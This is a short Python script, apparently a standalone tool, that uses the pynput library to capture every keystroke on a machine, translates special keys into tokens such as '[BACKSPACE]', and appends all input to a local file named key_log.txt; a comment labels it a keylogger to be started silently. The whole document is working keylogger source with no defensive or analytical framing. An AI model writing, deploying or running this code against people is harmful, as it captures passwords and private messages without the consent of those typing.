from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        k = key.char  # Regular character
    except AttributeError:
        # Special keys
        if key == keyboard.Key.space:
            k = ' '
        elif key == keyboard.Key.enter:
            k = '\n'
        elif key == keyboard.Key.tab:
            k = '\t'
        elif key == keyboard.Key.backspace:
            k = '[BACKSPACE]'
        else:
            k = f'[{key.name.upper()}]'

    # Write to file
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(str(k))

# Start keylogger silently
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()  # Keep the script running
